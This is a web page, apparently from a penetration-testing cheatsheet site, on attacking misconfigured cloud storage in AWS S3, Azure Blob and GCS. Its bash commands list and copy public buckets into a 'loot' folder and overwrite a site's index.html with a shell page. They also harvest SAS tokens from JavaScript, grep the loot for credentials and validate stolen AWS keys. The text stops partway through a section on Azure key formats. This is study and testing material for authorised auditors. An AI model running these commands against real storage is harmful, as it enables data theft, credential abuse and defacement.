@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cloud Storage | JinPwn</title><meta name="description" content="S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/cloud/cloud-storage/">
+<meta property="og:title" content="Cloud Storage | JinPwn">
+<meta property="og:description" content="S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/cloud/cloud-storage/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Cloud Storage | JinPwn">
+<meta name="twitter:description" content="S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Cloud Storage | JinPwn","url":"https://jinpwn.dev/cheatsheets/cloud/cloud-storage/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Cloud Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/cloud/" class="cheatsheet-sidebar-section">Cloud Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-sidebar-link">Cloud MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-sidebar-link">Cloud Recon</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-sidebar-link is-current">Cloud Storage</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/aws/" class="cheatsheet-sidebar-link">AWS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/azure/" class="cheatsheet-sidebar-link">Azure</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-sidebar-link">GCP</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Cloud Storage</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Cloud Storage</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Cloud Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/cloud/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-mobile-sections-link">Cloud MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-mobile-sections-link">Cloud Recon</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-mobile-sections-link is-current">Cloud Storage</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/aws/" class="cheatsheet-mobile-sections-link">AWS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/azure/" class="cheatsheet-mobile-sections-link">Azure</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-mobile-sections-link">GCP</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>target.com
+</span></span><span class="line"><span class="cl"><span class="nv">BUCKET</span><span class="o">=</span>target-prod-assets
+</span></span></code></pre></div><h2 id="i-aws-s3" data-heading-permalink="true"><span class="heading-content">i. AWS S3</span>
+    <a class="heading-permalink" href="#i-aws-s3" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="anonymous-access-tests" data-heading-permalink="true"><span class="heading-content">Anonymous access tests</span>
+    <a class="heading-permalink" href="#anonymous-access-tests" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## List bucket contents (anonymous):</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;https://</span><span class="nv">$BUCKET</span><span class="s2">.s3.amazonaws.com/&#34;</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;https://s3.amazonaws.com/</span><span class="nv">$BUCKET</span><span class="s2">/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Both formats work. Different responses tell you about region restrictions.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## With aws CLI (no credentials needed for public):</span>
+</span></span><span class="line"><span class="cl">aws s3 ls <span class="s2">&#34;s3://</span><span class="nv">$BUCKET</span><span class="s2">/&#34;</span> --no-sign-request
+</span></span><span class="line"><span class="cl">aws s3 cp <span class="s2">&#34;s3://</span><span class="nv">$BUCKET</span><span class="s2">/file.txt&#34;</span> - --no-sign-request
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Recursive download of everything readable:</span>
+</span></span><span class="line"><span class="cl">aws s3 sync <span class="s2">&#34;s3://</span><span class="nv">$BUCKET</span><span class="s2">/&#34;</span> ./loot --no-sign-request
+</span></span></code></pre></div><p>Status codes:</p>
+<ul>
+<li><strong>200 OK with XML body</strong>: listing allowed, you see all object keys</li>
+<li><strong>200 OK no body, 403 on objects</strong>: bucket policy allows listing but blocks reads</li>
+<li><strong>403 AccessDenied</strong>: bucket exists, listing denied, may still have specific public objects</li>
+<li><strong>404 NoSuchBucket</strong>: doesn&rsquo;t exist</li>
+<li><strong>301 Moved Permanently</strong>: wrong region, try the URL in the response</li>
+</ul>
+<h3 id="object-level-acl-grants-write-to-public-bucket" data-heading-permalink="true"><span class="heading-content">Object-level ACL grants (write to public bucket)</span>
+    <a class="heading-permalink" href="#object-level-acl-grants-write-to-public-bucket" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some buckets allow <code>s3:PutObject</code> to anyone. Test:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;test&#39;</span> &gt; /tmp/x.txt
+</span></span><span class="line"><span class="cl">aws s3 cp /tmp/x.txt <span class="s2">&#34;s3://</span><span class="nv">$BUCKET</span><span class="s2">/&#34;</span> --no-sign-request
+</span></span><span class="line"><span class="cl"><span class="c1">## Success = you can overwrite files in the bucket</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Path traversal for static-site buckets:</span>
+</span></span><span class="line"><span class="cl">aws s3 cp /tmp/shell.html <span class="s2">&#34;s3://</span><span class="nv">$BUCKET</span><span class="s2">/index.html&#34;</span> --no-sign-request
+</span></span></code></pre></div><h3 id="misconfigured-acls-to-look-for" data-heading-permalink="true"><span class="heading-content">Misconfigured ACLs to look for</span>
+    <a class="heading-permalink" href="#misconfigured-acls-to-look-for" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws s3api get-bucket-acl --bucket <span class="s2">&#34;</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --no-sign-request
+</span></span><span class="line"><span class="cl">aws s3api get-bucket-policy --bucket <span class="s2">&#34;</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --no-sign-request
+</span></span><span class="line"><span class="cl">aws s3api get-bucket-cors --bucket <span class="s2">&#34;</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --no-sign-request
+</span></span><span class="line"><span class="cl">aws s3api get-bucket-versioning --bucket <span class="s2">&#34;</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --no-sign-request
+</span></span></code></pre></div><p>Read the policy JSON. Look for <code>Principal: *</code> or <code>AWS: *</code> on dangerous actions (<code>s3:PutObject</code>, <code>s3:DeleteObject</code>, <code>s3:PutBucketPolicy</code>).</p>
+<h3 id="common-bucket-discovery-shortcuts" data-heading-permalink="true"><span class="heading-content">Common bucket discovery shortcuts</span>
+    <a class="heading-permalink" href="#common-bucket-discovery-shortcuts" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## s3scanner: bulk testing</span>
+</span></span><span class="line"><span class="cl">s3scanner scan --buckets-file potential.txt --output found.txt
+</span></span><span class="line"><span class="cl"><span class="c1">## Bucket name in target&#39;s web app source code:</span>
+</span></span><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> <span class="p">|</span> grep -oE <span class="s1">&#39;s3[a-z0-9.-]*\.amazonaws\.com&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Bucket referenced via CloudFront origin:</span>
+</span></span><span class="line"><span class="cl">dig +short cdn.target.com    <span class="c1">## may resolve to bucket-name.s3.amazonaws.com</span>
+</span></span></code></pre></div><h3 id="versioned-objects-pull-olddeleted-files" data-heading-permalink="true"><span class="heading-content">Versioned objects: pull old/deleted files</span>
+    <a class="heading-permalink" href="#versioned-objects-pull-olddeleted-files" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>If <code>s3api get-bucket-versioning</code> shows <code>Enabled</code>, you can read previous object versions even when the current version was &ldquo;deleted&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws s3api list-object-versions --bucket <span class="s2">&#34;</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --no-sign-request
+</span></span><span class="line"><span class="cl">aws s3api get-object --bucket <span class="s2">&#34;</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --key file.txt --version-id &lt;VERSION_ID&gt; /tmp/old.txt --no-sign-request
+</span></span></code></pre></div><h2 id="ii-azure-blob-storage" data-heading-permalink="true"><span class="heading-content">ii. Azure Blob Storage</span>
+    <a class="heading-permalink" href="#ii-azure-blob-storage" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="url-structure" data-heading-permalink="true"><span class="heading-content">URL structure</span>
+    <a class="heading-permalink" href="#url-structure" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>https://&lt;storage_account&gt;.blob.core.windows.net/&lt;container&gt;/&lt;blob&gt;
+</code></pre><h3 id="anonymous-access-tests-1" data-heading-permalink="true"><span class="heading-content">Anonymous access tests</span>
+    <a class="heading-permalink" href="#anonymous-access-tests-1" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## List container contents (anonymous):</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;https://</span><span class="nv">$STORAGE</span><span class="s2">.blob.core.windows.net/</span><span class="nv">$CONTAINER</span><span class="s2">?restype=container&amp;comp=list&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## With az CLI (no auth for public):</span>
+</span></span><span class="line"><span class="cl">az storage blob list --account-name <span class="s2">&#34;</span><span class="nv">$STORAGE</span><span class="s2">&#34;</span> --container-name <span class="s2">&#34;</span><span class="nv">$CONTAINER</span><span class="s2">&#34;</span> --auth-mode login --output table
+</span></span></code></pre></div><p>Status codes:</p>
+<ul>
+<li><strong>200 OK with XML</strong>: anonymous listing allowed (<code>PublicAccess: Container</code>)</li>
+<li><strong>200 OK on specific blobs only</strong>: <code>PublicAccess: Blob</code> (read individual blobs if you know names, no listing)</li>
+<li><strong>404 ContainerNotFound</strong> or <strong>403</strong>: not accessible anonymously</li>
+</ul>
+<h3 id="discover-containers-and-blobs" data-heading-permalink="true"><span class="heading-content">Discover containers and blobs</span>
+    <a class="heading-permalink" href="#discover-containers-and-blobs" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Common container names: $logs $web data backup files images uploads media public assets</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> c in <span class="s1">&#39;$logs&#39;</span> <span class="s1">&#39;$web&#39;</span> data backup files images uploads media public assets logs reports<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">url</span><span class="o">=</span><span class="s2">&#34;https://</span><span class="nv">$STORAGE</span><span class="s2">.blob.core.windows.net/</span><span class="nv">$c</span><span class="s2">?restype=container&amp;comp=list&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">code</span><span class="o">=</span><span class="k">$(</span>curl -sI <span class="s2">&#34;</span><span class="nv">$url</span><span class="s2">&#34;</span> -o /dev/null -w <span class="s2">&#34;%{http_code}&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$code</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;200&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;PUBLIC LIST: </span><span class="nv">$STORAGE</span><span class="s2">/</span><span class="nv">$c</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></div><h3 id="pre-signed-url--sas-token-leakage" data-heading-permalink="true"><span class="heading-content">Pre-signed URL / SAS token leakage</span>
+    <a class="heading-permalink" href="#pre-signed-url--sas-token-leakage" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Search the target&rsquo;s HTML/JS for SAS tokens (look for <code>?sv=</code> query strings):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://</span><span class="nv">$DOMAIN</span><span class="s2">/app.js&#34;</span> <span class="p">|</span> grep -oE <span class="s1">&#39;https://[^&#34;]+blob\.core\.windows\.net[^&#34;]+\?sv=[^&#34;]+&#39;</span>
+</span></span></code></pre></div><p>Once you have a SAS token, you have whatever rights the token grants until it expires (often months). Common leakage: SAS tokens hardcoded in mobile app reverse engineering, JavaScript bundles, public S3 buckets containing config files.</p>
+<h2 id="iii-gcs-google-cloud-storage" data-heading-permalink="true"><span class="heading-content">iii. GCS (Google Cloud Storage)</span>
+    <a class="heading-permalink" href="#iii-gcs-google-cloud-storage" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="url-structure-1" data-heading-permalink="true"><span class="heading-content">URL structure</span>
+    <a class="heading-permalink" href="#url-structure-1" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>https://storage.googleapis.com/&lt;bucket&gt;/&lt;object&gt;
+https://&lt;bucket&gt;.storage.googleapis.com/&lt;object&gt;
+</code></pre><h3 id="anonymous-access-tests-2" data-heading-permalink="true"><span class="heading-content">Anonymous access tests</span>
+    <a class="heading-permalink" href="#anonymous-access-tests-2" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## List bucket (anonymous):</span>
+</span></span><span class="line"><span class="cl">curl <span class="s2">&#34;https://storage.googleapis.com/storage/v1/b/</span><span class="nv">$BUCKET</span><span class="s2">/o&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## With gcloud (will use whatever auth you have, no auth = anonymous):</span>
+</span></span><span class="line"><span class="cl">gcloud storage ls <span class="s2">&#34;gs://</span><span class="nv">$BUCKET</span><span class="s2">/&#34;</span> --no-user-output-enabled 2&gt;/dev/null
+</span></span></code></pre></div><p>Status codes follow REST conventions: 200 listing, 401/403 auth required, 404 not found.</p>
+<h3 id="iam-on-buckets-vs-acls-on-objects" data-heading-permalink="true"><span class="heading-content">IAM on buckets vs ACLs on objects</span>
+    <a class="heading-permalink" href="#iam-on-buckets-vs-acls-on-objects" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>GCS has two permission models:</p>
+<ul>
+<li><strong>Bucket-level IAM</strong> (modern, recommended)</li>
+<li><strong>Legacy ACLs on individual objects</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Read bucket IAM:</span>
+</span></span><span class="line"><span class="cl">gcloud storage buckets describe <span class="s2">&#34;gs://</span><span class="nv">$BUCKET</span><span class="s2">&#34;</span> --format<span class="o">=</span>json
+</span></span><span class="line"><span class="cl"><span class="c1">## Read object ACL:</span>
+</span></span><span class="line"><span class="cl">gcloud storage objects describe <span class="s2">&#34;gs://</span><span class="nv">$BUCKET</span><span class="s2">/file.txt&#34;</span> --format<span class="o">=</span>json
+</span></span></code></pre></div><p>Public exposure happens at either level. Look for <code>allUsers</code> or <code>allAuthenticatedUsers</code> as bindings/members.</p>
+<h3 id="gcs_enum--gcpbucketbrute" data-heading-permalink="true"><span class="heading-content">gcs_enum / GCPBucketBrute</span>
+    <a class="heading-permalink" href="#gcs_enum--gcpbucketbrute" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Wordlist-based brute force with permission analysis:</span>
+</span></span><span class="line"><span class="cl">gcpbucketbrute -k target -u  <span class="c1">## -u = unauthenticated</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## With auth (more permissions visible):</span>
+</span></span><span class="line"><span class="cl">gcpbucketbrute -k target -s service-account.json
+</span></span></code></pre></div><h2 id="iv-common-file-types-worth-looking-for" data-heading-permalink="true"><span class="heading-content">iv. Common file types worth looking for</span>
+    <a class="heading-permalink" href="#iv-common-file-types-worth-looking-for" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>After a public-bucket find, search recursively for these patterns:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Once you have a sync of the bucket contents:</span>
+</span></span><span class="line"><span class="cl">find ./loot -type f <span class="se">\(</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;*.env&#39;</span> -o -name <span class="s1">&#39;.env*&#39;</span> -o <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;*.key&#39;</span> -o -name <span class="s1">&#39;*.pem&#39;</span> -o -name <span class="s1">&#39;*.p12&#39;</span> -o -name <span class="s1">&#39;*.pfx&#39;</span> -o <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;*.sql&#39;</span> -o -name <span class="s1">&#39;*.bak&#39;</span> -o -name <span class="s1">&#39;*.backup&#39;</span> -o <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;config.*&#39;</span> -o -name <span class="s1">&#39;*.config&#39;</span> -o <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;.git*&#39;</span> -o -name <span class="s1">&#39;.dockerignore&#39;</span> -o <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;docker-compose.*&#39;</span> -o -name <span class="s1">&#39;kubernetes.*&#39;</span> -o <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -name <span class="s1">&#39;*.tar.gz&#39;</span> -o -name <span class="s1">&#39;*.zip&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se">\)</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Grep for credentials in everything:</span>
+</span></span><span class="line"><span class="cl">grep -rE <span class="s1">&#39;AKIA[0-9A-Z]{16}|aws_secret_access_key|client_secret|api_key|password|private_key&#39;</span> ./loot/ 2&gt;/dev/null
+</span></span></code></pre></div><h2 id="v-aws-access-key-formats-recognize-what-you-find" data-heading-permalink="true"><span class="heading-content">v. AWS access key formats (recognize what you find)</span>
+    <a class="heading-permalink" href="#v-aws-access-key-formats-recognize-what-you-find" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Prefix</th>
+          <th>Type</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>AKIA...</code></td>
+          <td>Long-term IAM user access key</td>
+      </tr>
+      <tr>
+          <td><code>ASIA...</code></td>
+          <td>Short-term STS session token (temporary)</td>
+      </tr>
+      <tr>
+          <td><code>AROA...</code></td>
+          <td>Role IDs (not keys, but appear in policies)</td>
+      </tr>
+      <tr>
+          <td><code>AGPA...</code></td>
+          <td>Group IDs</td>
+      </tr>
+      <tr>
+          <td><code>AIPA...</code></td>
+          <td>EC2 instance profile</td>
+      </tr>
+      <tr>
+          <td><code>ANPA...</code></td>
+          <td>Managed policy IDs</td>
+      </tr>
+      <tr>
+          <td><code>ANVA...</code></td>
+          <td>Anonymous IDs</td>
+      </tr>
+  </tbody>
+</table>
+<p>If you find <code>AKIA...</code> in a public bucket, also look for the matching <code>aws_secret_access_key=</code> in the same file or repo.</p>
+<h2 id="vi-validate-found-aws-keys" data-heading-permalink="true"><span class="heading-content">vi. Validate found AWS keys</span>
+    <a class="heading-permalink" href="#vi-validate-found-aws-keys" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>AKIA...
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>...
+</span></span><span class="line"><span class="cl">aws sts get-caller-identity
+</span></span><span class="line"><span class="cl"><span class="c1">## If valid: outputs ARN, user, account ID</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Then continue to [AWS](https://jinpwn.dev/cheatsheets/cloud/aws/) for privesc paths</span>
+</span></span></code></pre></div><p>For temporary creds (<code>ASIA...</code>), also set <code>AWS_SESSION_TOKEN</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>...
+</span></span><span class="line"><span class="cl">aws sts get-caller-identity
+</span></span></code></pre></div><h2 id="vii-azure-key-formats" data-heading-permalink="true"><span class="heading-content">vii. Azure key formats</span>
+    <a class="heading-permalink" href="#vii-azure-key-formats" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Storage account access keys (base64, 88 chars):</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>A-Za-z0-9+/<span class="o">]{</span>86<span class="o">}==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## SAS tokens (query string starting with ?sv=):</span>
+</span></span><span class="line"><span class="cl">?sv<span class="o">=</span>2021-12-02<span class="p">&amp;</span><span class="nv">ss</span><span class="o">=</span>b<span class="p">&amp;</span><span class="nv">srt</span><span class="o">=</span>sco<span class="p">&amp;</span><span class="nv">sp</span><span class="o">=</span>rwdlacx<span class="p">&amp;</span><span class="nv">se</span><span class="o">=</span>2026-01-01T00:00:00Z<span class="p">&amp;</span>...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Service principal credentials (in JSON):</span>
